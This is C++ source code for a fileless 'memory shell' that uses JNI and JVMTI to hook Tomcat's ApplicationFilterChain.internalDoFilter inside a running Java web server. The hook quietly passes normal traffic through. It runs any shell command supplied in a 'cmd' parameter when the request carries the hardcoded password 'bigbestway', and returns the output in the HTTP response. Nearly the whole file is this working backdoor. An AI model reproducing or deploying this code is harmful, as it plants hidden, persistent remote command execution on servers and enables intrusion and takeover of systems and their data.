#include "include/java_native_base.h"
#include "include/jvm_method.h"
#include "memshell.h"

#define DEBUG 0

#if DEBUG == 1
#define DPRINT(x, args...) printf(x, ##args)
#else
#define DPRINT(x,  args...)
#endif

class example : JavaNativeBase
{
public:
    example(/* args */);
    ~example(){};
private:
    void inject_mem_shell();
};

static example _e;
static jclass _servlet_clazz, _applicationFilterChain_clazz;

/*
typedef jint (*FUNC_PTR)(JNIEnv* env, jobject thiz);
static FUNC_PTR _origin_native_func_ptr;

JNIEXPORT jint JNICALL hook_replace(JNIEnv* env, jobject thiz)
{
    printf("you are hacked again!\n");
    return _origin_native_func_ptr(env, thiz);
}

JNIEXPORT void JNICALL hook_circle(JNIEnv* env, jobject thiz)
{
    // Get system class
    jclass syscls = env->FindClass("java/lang/System");
    // Lookup the "out" field
    jfieldID fid = env->GetStaticFieldID(syscls, "out", "Ljava/io/PrintStream;");
    jobject out = env->GetStaticObjectField(syscls, fid);
    // Get PrintStream class
    jclass pscls = env->FindClass("java/io/PrintStream");
    // Lookup printLn(String)
    jmethodID mid = env->GetMethodID(pscls, "println", "(Ljava/lang/String;)V");
    // Invoke the method
    jstring str = env->NewStringUTF( "you are hacked");
    env->CallVoidMethod(out, mid, str);
}
*/
jobject req_get_paramter(JNIEnv * env, jobject req, const char * name)
{
    static jclass _req_clazz = NULL;
    if(_req_clazz == NULL)
    {
        _req_clazz = JavaNativeBase::jvmti_find_class("javax.servlet.ServletRequest");
    }

    if(_req_clazz)
    {
        jmethodID mid = env->GetMethodID(_req_clazz, "getParameter", "(Ljava/lang/String;)Ljava/lang/String;");
        if(mid == NULL)
        {
            return NULL;
        }
        DPRINT("GetMethodID getParameter %p\n", mid);
        return env->CallObjectMethod(req, mid, env->NewStringUTF(name));
    }
    return NULL;
}

jboolean string_equals(JNIEnv * env, jobject str, const char * name)
{
    jclass string_clazz = env->FindClass("java/lang/String");
    if(string_clazz == NULL)
    {
        return 0;
    }
    DPRINT("string_clazz %p\n", string_clazz);
    jmethodID equals_mid = env->GetMethodID(string_clazz, "equalsIgnoreCase", "(Ljava/lang/String;)Z");
    if(equals_mid == NULL)
        return 0;
    DPRINT("equals_mid %p\n", equals_mid);
    return env->CallBooleanMethod(str, equals_mid, env->NewStringUTF(name));
}

std::string string_getchars(JNIEnv * env, jstring str)
{
    jboolean isCopy;
    const char * s = env->GetStringUTFChars(str, &isCopy);
    if(s == NULL)
        return "";
    std::string result = s;
    if(isCopy)
        env->ReleaseStringUTFChars(str, s);
    return result;
}

void rsp_print(JNIEnv * env, jobject rsp, const char * msg)
{
    jclass rsp_clazz = JavaNativeBase::jvmti_find_class("javax.servlet.ServletResponse");
    if(rsp_clazz == NULL)
        return;
    DPRINT("ServletResponse =%p\n", rsp_clazz);
    jmethodID mid = env->GetMethodID(rsp_clazz, "getWriter", "()Ljava/io/PrintWriter;");
    if(mid == NULL)
        return;
    DPRINT("getWriter mid=%p\n", mid);
    jobject writer = env->CallObjectMethod(rsp, mid);
    if(writer == NULL)
        return;
    jclass writer_clazz = JavaNativeBase::jvmti_find_class("java.io.PrintWriter");
    if(writer_clazz == NULL)
        return;
    jmethodID print_mid = env->GetMethodID(writer_clazz, "print", "(Ljava/lang/String;)V");
    if(print_mid == NULL)
        return;
    DPRINT("print_mid =%p\n", print_mid);
    env->CallVoidMethod(writer, print_mid, env->NewStringUTF(msg));
}

JNIEXPORT void JNICALL hook_internalFilter(JNIEnv * env, jobject thiz, jobject req, jobject rsp)
{
    jobject model = req_get_paramter(env, req, "model");
    jobject pass_the_world = req_get_paramter(env, req, "pass_the_world");

    if(pass_the_world != NULL && string_equals(env, pass_the_world, "bigbestway"))
    {
        std::string result;
        if(model == NULL || string_equals(env, model, ""))
        {
            result = Memshell::help();
        }
        else if(string_equals(env, model, "exec"))
        {
            jobject cmd = req_get_paramter(env, req, "cmd");
            if(cmd == NULL)
            {
                result = Memshell::help();
            }
            else
            {
                result = Memshell::exec(string_getchars(env, (jstring)cmd).c_str());
            }
        }
        rsp_print(env, rsp, result.c_str());
        return;
    }

    //调用this.servlet.service(req, rsp);
    DPRINT("hook_internalFilter req=%p, rsp=%p\n", req, rsp);
    jfieldID fid = env->GetFieldID(_applicationFilterChain_clazz, "servlet", "Ljavax/servlet/Servlet;");
    DPRINT("fid=%p\n", fid);
    if(fid == NULL)
        return;
    jobject servlet = env->GetObjectField(thiz, fid);
    DPRINT("servlet=%p\n", servlet);
    if(servlet == NULL)
        return;
    jmethodID mid = env->GetMethodID(_servlet_clazz, "service", "(Ljavax/servlet/ServletRequest;Ljavax/servlet/ServletResponse;)V");
    DPRINT("mid=%p\n", mid);
    if(mid == NULL)
        return;
    env->CallVoidMethod(servlet, mid, req, rsp);
}

void example::inject_mem_shell()
{
    JNIEnv * env = getJNIEnv();
    if(env == NULL)
    {
        return;
    }

    jvmtiEnv * jvmti_env = getJVMTIEnv();
    if(jvmti_env == NULL)
    {
        return;
    }

    //printf("JVMTI ENV %p\n", jvmti_env);
    
    _applicationFilterChain_clazz = this->jvmti_find_class("org.apache.catalina.core.ApplicationFilterChain");
    if(_applicationFilterChain_clazz == NULL){
        printf("FindClass org.apache.catalina.core.ApplicationFilterChain error\n");
        return;
    }

    _servlet_clazz = this->jvmti_find_class("javax.servlet.Servlet");
    if(_servlet_clazz == NULL){
        printf("FindClass javax.servlet.Servlet error\n");
        return;
    }

    const char * internalDoFilter_signature = "(Ljavax/servlet/ServletRequest;Ljavax/servlet/ServletResponse;)V";
    jmethodID internalDoFilter = env->GetMethodID(_applicationFilterChain_clazz, "internalDoFilter", internalDoFilter_signature);
    if(internalDoFilter == NULL){
        printf("jvmti_get_method internalDoFilter error\n");
        return;
    }

    JVMMethodID * method = (JVMMethodID *)internalDoFilter;
    method->print();
    hookJvmMethod(method,(unsigned long)hook_internalFilter);
    printf("==================================\n");
    method->print();
}

example::example(/* args */)
{    
    inject_mem_shell();
}